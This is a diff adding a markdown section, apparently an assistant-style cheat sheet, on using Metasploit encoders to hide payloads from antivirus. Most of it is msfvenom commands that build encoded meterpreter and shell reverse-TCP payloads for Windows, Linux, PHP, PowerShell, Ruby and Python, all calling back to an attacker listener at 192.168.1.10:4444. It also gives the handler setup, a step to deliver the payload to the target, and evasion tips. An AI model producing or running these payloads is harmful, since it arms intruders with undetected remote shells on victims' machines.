@@ -352,3 +352,144 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f hex
 ---
 
 Let me know if you need additional examples or help with specific scenarios!
+
+### **Encoders in Metasploit**
+
+Encoders in Metasploit are used to obfuscate payloads to bypass detection mechanisms, such as antivirus software and intrusion detection systems (IDS). Encoding helps avoid detection by reformatting the payload without altering its functionality.
+
+---
+
+### **How Encoders Work**
+1. **Obfuscation**: Encoders transform the payload into a new format to make it less recognizable.
+2. **Decoding at Execution**: Once the encoded payload is executed on the target system, it decodes itself back to the original form.
+3. **Iteration**: Encoders can be applied multiple times (`-i` flag) to increase complexity.
+
+---
+
+### **Commonly Used Encoders**
+Here are some popular encoders and their purposes:
+- **x86/shikata_ga_nai**: One of the most popular encoders. Polymorphic and highly effective for Windows.
+- **cmd/powershell_base64**: Encodes payloads in Base64 for PowerShell delivery.
+- **php/base64**: Encodes PHP payloads in Base64.
+- **ruby/base64**: Encodes Ruby payloads in Base64.
+- **x86/call4_dword_xor**: XOR-based encoder for x86 architectures.
+- **x86/bloxor**: A polymorphic XOR-based encoder.
+
+---
+
+### **Encoding Syntax**
+```bash
+msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -e <ENCODER> -i <ITERATIONS> -f <FORMAT> -o <OUTPUT>
+```
+
+- `-e`: Specifies the encoder.
+- `-i`: Number of iterations to encode.
+- `-f`: Output format (e.g., exe, elf, raw).
+- `-o`: Output file name.
+
+---
+
+### **Examples of Encoding Payloads**
+
+#### **1. Using x86/shikata_ga_nai Encoder**
+This is the most common encoder for Windows payloads:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
+```
+- **LHOST**: Attacker's IP address.
+- **LPORT**: Listening port.
+- **-i 5**: Encodes the payload 5 times.
+
+#### **2. PHP Payload with Base64 Encoding**
+Useful for delivering web-based payloads:
+```bash
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e php/base64 -f raw -o encoded_payload.php
+```
+
+#### **3. Linux ELF Payload with XOR Encoder**
+Encode a Linux ELF payload with XOR encoding:
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/call4_dword_xor -i 3 -f elf -o encoded_payload.elf
+```
+
+#### **4. PowerShell Payload Encoded in Base64**
+Encode a PowerShell payload for delivery via command-line:
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e cmd/powershell_base64 -f raw -o encoded_powershell.ps1
+```
+
+#### **5. Ruby Payload Encoded in Base64**
+Encode a Ruby payload for custom scripts:
+```bash
+msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e ruby/base64 -f raw -o encoded_payload.rb
+```
+
+#### **6. Python Payload with Base64 Encoding**
+Encode a Python payload for manual injection:
+```bash
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e cmd/base64 -f raw -o encoded_payload.py
+```
+
+---
+
+### **Customizing Encoding**
+#### **7. Add Exit Function**
+You can specify the exit function (process/thread):
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 EXITFUNC=thread -e x86/shikata_ga_nai -i 3 -f exe -o thread_exit_payload.exe
+```
+
+#### **8. Multi-Iteration Encoding**
+Encode multiple times to increase obfuscation:
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o multi_encoded_payload.exe
+```
+
+---
+
+### **Testing the Encoded Payload**
+1. Set up a Metasploit listener:
+   ```bash
+   use exploit/multi/handler
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   set LHOST 192.168.1.10
+   set LPORT 4444
+   exploit
+   ```
+
+2. Deliver the payload to the target system.
+
+---
+
+### **Antivirus Evasion Tips**
+- **Use Polymorphic Encoders**: Use encoders like `x86/shikata_ga_nai`.
+- **Chain Multiple Encoders**: Combine multiple encoders for better obfuscation.
+- **Modify Payloads**: Add dummy instructions or alter payload signatures.
+- **Use Third-Party Tools**: Tools like Veil or Shellter can further enhance evasion.
+
+---
+
+### **List of Available Encoders**
+To view all available encoders in Metasploit:
+```bash
+msfvenom --list encoders
+```
+
+Example output:
+```plaintext
+Encoders
+========
+Name                          Rank       Description
+----                          ----       -----------
+cmd/powershell_base64         excellent  Command Powershell Base64
+php/base64                    excellent  PHP Base64 Encoder
+ruby/base64                   excellent  Ruby Base64 Encoder
+x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+x86/bloxor                    good       Polymorphic Block XOR Encoder
+x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
+x64/xor_dynamic               normal     Dynamic key XOR Encoder
+```
+
+---
+
+Let me know if you need more examples, tips, or help with specific encoders!
